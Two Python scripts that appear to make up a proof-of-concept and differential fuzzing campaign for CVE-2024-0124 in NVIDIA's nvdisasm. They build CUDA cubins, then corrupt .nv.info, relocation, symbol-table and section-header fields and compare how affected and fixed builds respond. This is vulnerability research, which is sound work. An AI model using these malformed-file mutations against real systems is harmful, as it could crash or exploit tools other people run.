#!/usr/bin/env python3
"""Recon: build bases that exercise nvdisasm's metadata paths, dump structure."""
import struct, subprocess, sys, os

W = "/work"
def sh(cmd):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return r.returncode, r.stdout, r.stderr

os.makedirs(W+"/in", exist_ok=True)
os.makedirs(W+"/mut", exist_ok=True)

# --- bases -------------------------------------------------------------
kernels = {
 "plain": r'''
__global__ void addk(float* a, const float* b, int n) {
  int i = blockIdx.x*blockDim.x+threadIdx.x;
  if (i<n) a[i]=a[i]*2.0f+b[i];
}''',
 "reloc": r'''
__device__ float df_impl(float x){ return x*x+1.0f; }
__device__ float (*dfp)(float) = df_impl;
__global__ void indirectk(float* a, float v){
  a[threadIdx.x] = dfp(v);      /* indirect call -> EIATTR_INDIRECT_BRANCH_TARGETS */
}''',
 "smem": r'''
extern __shared__ float s[];
__device__ int gtab[64];
__global__ void smemk(float* a,int n){
  int i=threadIdx.x; s[i]=a[i]; __syncthreads();
  gtab[i&63]=i; a[i]=s[n-1-i]+gtab[i&63];
}''',
}
built = []
for name, src in kernels.items():
    open(f"{W}/in/{name}.cu","w").write(src)
    # -rdc for the indirect-call kernel so device function pointers/relocations exist
    extra = "-rdc=true -dlink " if name=="reloc" else ""
    if name=="reloc":
        rc,o,e = sh(f"cd {W} && nvcc -arch=sm_75 -rdc=true -cubin -o in/{name}.cubin in/{name}.cu")
        if rc!=0:
            # fall back: two-step with device linking artifacts
            rc,o,e = sh(f"cd {W} && nvcc -arch=sm_75 -rdc=true -c -o in/{name}.o in/{name}.cu")
            print(f"[{name}] rdc cubin rc={rc} err={e.strip()[:200]}")
            if rc==0: built.append(f"in/{name}.o")
            continue
    else:
        rc,o,e = sh(f"cd {W} && nvcc -arch=sm_75 -cubin -o in/{name}.cubin in/{name}.cu")
    print(f"[{name}] rc={rc} {e.strip()[:200]}")
    if rc==0: built.append(f"in/{name}.cubin")

# relocations: a relocatable object with relocs into .text
rc,o,e = sh(f"cd {W} && nvcc -arch=sm_75 -c -o in/relocobj.o in/reloc.cu")
print(f"[relocobj] rc={rc}")
if rc==0: built.append("in/relocobj.o")

print("\n=== bases ===")
for b in built:
    print(b, os.path.getsize(f"{W}/{b}"))

# --- nvdisasm option surface ------------------------------------------
print("\n=== nvdisasm --help (affected build) ===")
rc,o,e = sh(f"{W}/bin-nvdisasm-12.6.68-1 --help")
print(o[:3000])

# --- ELF structure dump -----------------------------------------------
def sections(path):
    d = open(path,'rb').read()
    assert d[:4]==b'\x7fELF'
    e_shoff, = struct.unpack_from('<Q', d, 0x28)
    e_shentsize, e_shnum, e_shstrndx = struct.unpack_from('<HHH', d, 0x3a)
    secs=[]
    for i in range(e_shnum):
        off = e_shoff + i*e_shentsize
        nm, ty, fl, ad, so, sz, lk, inf, al, es = struct.unpack_from('<IIQQQQIIQQ', d, off)
        secs.append(dict(i=i,name_off=nm,type=ty,flags=fl,addr=ad,offset=so,size=sz,link=lk,info=inf,ent=es))
    strtab = secs[e_shstrndx]
    names = d[strtab['offset']:strtab['offset']+strtab['size']]
    for s in secs:
        n = names[s['name_off']:names.find(b'\0', s['name_off'])]
        s['name'] = n.decode()
    return d, secs

for b in built:
    d, secs = sections(f"{W}/{b}")
    print(f"\n=== {b} ({len(d)} bytes) sections ===")
    for s in secs:
        print(f"  {s['i']:2d} {s['name']:24s} type={s['type']:#x} off={s['offset']:#x} size={s['size']:#x} link={s['link']} info={s['info']} ent={s['ent']}")
    for s in secs:
        if s['name'].startswith('.nv.info') or s['name'].startswith('.nv.rel') or s['name'].startswith('.rel'):
            blob = d[s['offset']:s['offset']+min(s['size'],192)]
            print(f"  -- {s['name']} hex --")
            for i in range(0, len(blob), 16):
                print("    %04x  %s" % (i, ' '.join(f"{x:02x}" for x in blob[i:i+16])))

#!/usr/bin/env python3
"""
CVE-2024-0124 PoC campaign: nvdisasm malformed-ELF mutations, affected vs fixed.

Every mutation carries an explicit hypothesis about which code path it targets.
Evidence recorded per case: exit code (negative => killed by that signal),
stdout bytes, stderr text, for BOTH builds, plus a differential verdict.
"""
import os, struct, subprocess, sys, json, hashlib, itertools

W = "/work"
AFF = f"{W}/bin-nvdisasm-12.6.68-1"   # CUDA 12.6U1 (affected)
FIX = f"{W}/bin-nvdisasm-12.6.77-1"   # CUDA 12.6U2 (fixed)
OUT = f"{W}/mut"
os.makedirs(OUT, exist_ok=True)

# ---------------------------------------------------------------- ELF utils
class Elf:
    def __init__(self, path):
        self.path = path
        self.d = bytearray(open(path, 'rb').read())
        assert self.d[:4] == b'\x7fELF'
        self.is64 = self.d[4] == 2
        (self.e_shoff,) = struct.unpack_from('<Q', self.d, 0x28)
        self.e_shentsize, self.e_shnum, self.e_shstrndx = struct.unpack_from('<HHH', self.d, 0x3a)
        self.secs = []
        for i in range(self.e_shnum):
            o = self.e_shoff + i*self.e_shentsize
            nm, ty, fl, ad, so, sz, lk, inf, al, es = struct.unpack_from('<IIQQQQIIQQ', self.d, o)
            self.secs.append(dict(i=i, name_off=nm, type=ty, flags=fl, addr=ad,
                                  offset=so, size=sz, link=lk, info=inf, align=al, ent=es, hdr=o))
        st = self.secs[self.e_shstrndx]
        names = bytes(self.d[st['offset']:st['offset']+st['size']])
        for s in self.secs:
            n = s['name_off']
            e = names.find(b'\0', n) if n < len(names) else -1
            s['name'] = names[n:e].decode('latin1') if e > 0 else ''

    def by_name(self, name):
        for s in self.secs:
            if s['name'] == name:
                return s
        return None

    def matching(self, pred):
        return [s for s in self.secs if pred(s)]

    def u8(self, off):   return self.d[off]
    def u16(self, off):  return struct.unpack_from('<H', self.d, off)[0]
    def u32(self, off):  return struct.unpack_from('<I', self.d, off)[0]
    def u64(self, off):  return struct.unpack_from('<Q', self.d, off)[0]
    def w8(self, off, v):  self.d[off] = v & 0xff
    def w16(self, off, v): struct.pack_into('<H', self.d, off, v & 0xffff)
    def w32(self, off, v): struct.pack_into('<I', self.d, off, v & 0xffffffff)
    def w64(self, off, v): struct.pack_into('<Q', self.d, off, v & 0xffffffffffffffff)

    def save(self, path):
        open(path, 'wb').write(bytes(self.d))
        return path

ATTR_HDR = 4          # .nv.info entry: u16 kind, u16 len, then len bytes

def walk_nvinfo(e, s):
    """Yield (offset_of_entry, kind, len, data_off) for .nv.info* attribute list."""
    p = s['offset']; end = s['offset'] + s['size']; out = []
    while p + ATTR_HDR <= end:
        kind = e.u16(p); ln = e.u16(p+2)
        out.append((p, kind, ln, p+ATTR_HDR))
        p += ATTR_HDR + ln + (ln & 1)
    return out

# ---------------------------------------------------------------- mutations
# Each: (name, hypothesis, function(Elf) -> None)
MUTS = []

def mut(name, hyp):
    def deco(f):
        MUTS.append((name, hyp, f)); return f
    return deco

@mut("nvinfo_len_overflow",
     "Enlarge an attribute length so the parser runs past .nv.info buffer (EIATTR/EIATTR_INDIRECT_BRANCH_TARGETS walk).")
def _(e):
    s = [x for x in e.matching(lambda s: s['name'].startswith('.nv.info.'))] or \
        [x for x in e.matching(lambda s: s['name'] == '.nv.info')]
    s = s[0]
    at = walk_nvinfo(e, s)
    p, kind, ln, do = at[-1]
    e.w16(p+2, min(0xffff, ln + 0x4000))

@mut("nvinfo_len_huge_last",
     "Set last attribute length to 0xffff so the next entry header is read far outside the section.")
def _(e):
    s = [x for x in e.matching(lambda s: s['name'].startswith('.nv.info.'))][0]
    p, kind, ln, do = walk_nvinfo(e, s)[-1]
    e.w16(p+2, 0xffff)

@mut("nvinfo_ibt_kind_lastbig",
     "Rewrite the final attribute as EIATTR_INDIRECT_BRANCH_TARGETS-like kind with a length spanning past section end.")
def _(e):
    s = [x for x in e.matching(lambda s: s['name'].startswith('.nv.info.'))][0]
    p, kind, ln, do = walk_nvinfo(e, s)[-1]
    e.w16(p, kind)              # keep kind (whatever metadata it is)
    e.w16(p+2, (s['offset'] + s['size']) - (p + ATTR_HDR) + 0x200)

@mut("nvinfo_size_short",
     "Shrink .nv.info sh_size so declared attributes exceed the section; parser must detect truncation, not read freed memory.")
def _(e):
    s = [x for x in e.matching(lambda s: s['name'].startswith('.nv.info.'))][0]
    e.w64(s['hdr'] + 0x20, max(4, s['size'] - 0x10))

@mut("nvinfo_size_zero",
     "Declare .nv.info size 0 while its content still describes attributes.")
def _(e):
    s = [x for x in e.matching(lambda s: s['name'].startswith('.nv.info.'))][0]
    e.w64(s['hdr'] + 0x20, 0)

@mut("nvinfo_off_eof",
     "Point .nv.info at end of file with a large size: parser must not read past the mapped image.")
def _(e):
    s = [x for x in e.matching(lambda s: s['name'].startswith('.nv.info.'))][0]
    e.w64(s['hdr'] + 0x18, len(e.d) - 8)
    e.w64(s['hdr'] + 0x20, 0x4000)

@mut("reloc_off_outside",
     "Set a relocation r_offset far outside the target section (fixed build adds 'Relocaiton offest outside section size').")
def _(e):
    rel = e.matching(lambda s: s['type'] == 9 or s['name'].startswith('.nv.rel'))
    if not rel: return
    s = rel[0]
    if s['size'] >= 16:
        e.w64(s['offset'], 0x7fffffff)          # r_offset (ELF64 Rela)

@mut("reloc_off_just_past",
     "r_offset exactly one byte past the last relocated section: off-by-one boundary of the new range check.")
def _(e):
    rel = e.matching(lambda s: s['type'] == 9 or s['name'].startswith('.nv.rel'))
    if not rel: return
    s = rel[0]
    tgt = e.secs[s['info']] if 0 < s['info'] < len(e.secs) else None
    off = (tgt['size'] + 1) if tgt else 0x1000
    e.w64(s['offset'], off)

@mut("reloc_sym_oob",
     "Relocation r_info symbol index far beyond .symtab: symbol lookup must bounds-check.")
def _(e):
    rel = e.matching(lambda s: s['type'] == 9 or s['name'].startswith('.nv.rel'))
    if not rel: return
    s = rel[0]
    e.w64(s['offset'] + 8, (0x0fffffff << 32) | (e.u64(s['offset']+8) & 0xffffffff))

@mut("reloc_link_bogus",
     "Point a relocation section's sh_link at a nonexistent section index.")
def _(e):
    rel = e.matching(lambda s: s['type'] == 9 or s['name'].startswith('.nv.rel'))
    if not rel: return
    s = rel[0]
    e.w32(s['hdr'] + 0x28, 0xff)

@mut("reloc_entsize_zero",
     "Set relocation sh_entsize to 0: parser loop over entries may not terminate or may mis-scale.")
def _(e):
    rel = e.matching(lambda s: s['type'] == 9 or s['name'].startswith('.nv.rel'))
    if not rel: return
    s = rel[0]
    e.w64(s['hdr'] + 0x38, 0)

@mut("sym_name_oob",
     "Symbol st_name far outside .strtab (classic off-the-end string read).")
def _(e):
    sym = e.by_name('.symtab')
    if not sym: return
    for k in range(1, min(6, sym['size']//24)):
        e.w32(sym['offset'] + k*24, 0x3fffffff)

@mut("symtab_size_huge",
     "Declare .symtab much larger than the file region it occupies.")
def _(e):
    sym = e.by_name('.symtab')
    if not sym: return
    e.w64(sym['hdr'] + 0x20, sym['size'] * 64)

@mut("shstrndx_bogus",
     "Set e_shstrndx beyond shnum so section-name resolution reads freed/absent name table.")
def _(e):
    e.w16(0x3e, 0x2000)

@mut("shnum_huge",
     "Declare a section count larger than the real table.")
def _(e):
    e.w16(0x3c, 0xffff)

@mut("text_size_huge",
     "Declare .text sh_size far larger than its file extent (instruction fetch past section).")
def _(e):
    t = [s for s in e.matching(lambda s: s['name'].startswith('.text.'))]
    if not t: return
    e.w64(t[0]['hdr'] + 0x20, t[0]['size'] * 32 + 0x1000)

@mut("text_off_eof",
     "Move .text to near EOF while keeping sh_size: SASS decoder reads past file end.")
def _(e):
    t = [s for s in e.matching(lambda s: s['name'].startswith('.text.'))]
    if not t: return
    e.w64(t[0]['hdr'] + 0x18, len(e.d) - 16)

@mut("shoff_eof",
     "Move e_shoff near EOF so the section header array itself is truncated.")
def _(e):
    e.w64(0x28, len(e.d) - 32)

@mut("nvinfo_truncate_file",
     "Truncate the file inside .nv.info after fixing up nothing: declared data is missing (short read).")
def _(e):
    s = [x for x in e.matching(lambda s: s['name'].startswith('.nv.info.'))][0]
    del e.d[s['offset'] + 0x08:]

FLAGSETS = [
    ("default", []),
    ("print-code", ["--print-code"]),
    ("cfg", ["--cfg"]),
    ("nodf", ["-ndf"]),
    ("lifranges", ["--print-life-ranges"]),
    ("funidx", ["--cuda-function-index=1"]),
]

def run(binpath, args, inp, timeout=25):
    try:
        r = subprocess.run([binpath] + args + [inp], capture_output=True, timeout=timeout)
        return dict(rc=r.returncode, sig=(-r.returncode if r.returncode < 0 else 0),
                    out=len(r.stdout), err=r.stderr.decode('latin1')[:400])
    except subprocess.TimeoutExpired:
        return dict(rc=None, sig=0, out=0, err="<<TIMEOUT>>")

BASES = ["in/plain.cubin", "in/smem.cubin", "in/reloc.cubin", "in/relocobj.o"]

def main():
    rows = []
    interesting = []
    for base in BASES:
        bp = f"{W}/{base}"
        if not os.path.exists(bp):
            print(f"skip missing base {base}"); continue
        for name, hyp, fn in MUTS:
            e = Elf(bp)
            try:
                fn(e)
            except Exception as ex:
                print(f"  mutation {name} on {base} failed to apply: {ex}"); continue
            outp = f"{OUT}/{os.path.basename(base)}.{name}.bin"
            e.save(outp)
            sha = hashlib.sha256(open(outp,'rb').read()).hexdigest()
            for fname, flags in FLAGSETS:
                ra = run(AFF, flags, outp)
                rf = run(FIX, flags, outp)
                verdict = "same"
                if ra['err'] == '<<TIMEOUT>>' or rf['err'] == '<<TIMEOUT>>':
                    verdict = "timeout"
                elif ra['sig'] or ra['rc'] != rf['rc']:
                    verdict = "DIFF-rc"
                elif ra['err'] != rf['err']:
                    verdict = "DIFF-msg"
                elif ra['out'] != rf['out']:
                    verdict = "DIFF-out"
                row = dict(base=base, mut=name, flags=fname, verdict=verdict, sha=sha,
                           aff_rc=ra['rc'], aff_sig=ra['sig'], aff_out=ra['out'], aff_err=ra['err'],
                           fix_rc=rf['rc'], fix_sig=rf['sig'], fix_out=rf['out'], fix_err=rf['err'],
                           hyp=hyp)
                rows.append(row)
                if verdict != "same":
                    interesting.append(row)
    json.dump(rows, open(f"{W}/results.json","w"), indent=1)
    print(f"total cases: {len(rows)}   differential: {len(interesting)}")
    print("=" * 100)
    for r in interesting:
        print(f"[{r['verdict']}] {r['base']} mut={r['mut']} flags={r['flags']}")
        print(f"    AFF rc={r['aff_rc']} sig={r['aff_sig']} out={r['aff_out']}B err={r['aff_err'][:160]!r}")
        print(f"    FIX rc={r['fix_rc']} sig={r['fix_sig']} out={r['fix_out']}B err={r['fix_err'][:160]!r}")
    print("=" * 100)
    sigs = [r for r in rows if r['aff_sig'] or r['fix_sig']]
    print(f"cases where EITHER build died by signal: {len(sigs)}")
    for r in sigs:
        print(f"  SIG {r['base']} {r['mut']} {r['flags']} aff_sig={r['aff_sig']} fix_sig={r['fix_sig']}")

main()
